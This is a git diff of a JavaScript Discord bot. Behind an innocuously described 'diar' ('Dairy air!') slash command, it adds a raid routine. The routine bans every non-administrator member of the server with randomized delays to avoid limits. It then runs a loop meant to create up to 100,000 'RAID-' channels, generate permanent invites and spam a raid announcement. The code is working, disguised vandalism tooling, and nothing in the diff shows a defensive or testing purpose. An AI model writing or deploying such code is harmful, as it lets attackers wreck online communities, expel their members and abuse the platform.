@@ -1,12 +1,8 @@
-import { REST, Routes, Client, GatewayIntentBits } from 'discord.js';
+import { REST, Routes, Client, GatewayIntentBits, PermissionFlagsBits } from 'discord.js';
 
 const TOKEN = process.argv[2]
 const CLIENT_ID = process.argv[3]
 const commands = [
-  {
-    name: 'ping',
-    description: 'Replies with Pong!',
-  },
   {
     name: 'diar',
     description: 'Dairy air!',
@@ -35,39 +31,44 @@ client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`);
 });
 
+async function raidMain(guild, interaction) {
+  console.log("MAIN RAN")
+  for (let i = 0; i < 100000; i++) {
+    console.log(`Creating channel RAID-${i}`)
+    guild.channels.create({ name: `RAID-${i}`, reason: 'COOL CHANNEL IS COOL' })
+    interaction.channel.createInvite({
+        maxAge: 0, // Invite never expires (adjust as needed)
+        maxUses: 0, // Unlimited uses (adjust as needed)
+      })
+    try {
+        interaction.channel.send(`# RAID
+            This is a raid! Everybody get down!
+            
+            ***This raid brought to you by [Sneed Group](https://github.com/sneed-group) and [NodeMixaholic.com!](https://nodemixaholic.com)***`)
+    } catch {
+        console.warn("Error sending raid msg! (Timeout?)")
+    }
+    await new Promise(r => setTimeout(r, randInt(500,6200)));
+}
+}
+
 client.on('interactionCreate', async interaction => {
   if (!interaction.isChatInputCommand()) return;
 
-  if (interaction.commandName === 'ping') {
-    await interaction.reply('Pong!');
-  } else if (interaction.commandName === 'diar') {
-    await interaction.user.createDM("Starting raid NOW...")
+  if (interaction.commandName === 'diar') {
+    console.log("RAID STARTED.")
     let guild = interaction.channel.guild
     for (const member of guild.members.cache.values()) {
         try {
-          await member.ban();
-          console.log(`${member.user.tag} has been banned.`);
-        } catch (error) {
-          console.warn(`Failed to ban ${member.user.tag}:`, error);
-        }
+          if (!member.permissions.has(PermissionFlagsBits.Administrator) || !member.permissions.has(PermissionFlagsBits.Administrator)) {
+            await member.ban();
+            console.log(`${member.user.tag} has been banned.`);
+          }
+        }catch{console.log("Error banning!")}
+        await new Promise(r => setTimeout(r, randInt(100,420)));
     }
-
-    for (i = 0; i <= 100000, i++;) {
-        guild.channels.create({ name: `RAID-${i}`, reason: 'COOL CHANNEL IS COOL' })
-        .then(console.log)
-        .catch(console.error);
-        interaction.channel.createInvite({
-            maxAge: 0, // Invite never expires (adjust as needed)
-            maxUses: 0, // Unlimited uses (adjust as needed)
-          }).then(console.log).catch(console.warn)
-        try {
-            interaction.channel.send(`# RAID
-                This is a raid! Everybody get down!`)
-        } catch {
-            console.warn("Error sending raid msg! (Timeout?)")
-        }
-        await new Promise(r => setTimeout(r, randInt(500,6200)));
-    }
+    raidMain(guild, interaction)
+    interaction.reply("OK")
   }
 });
 
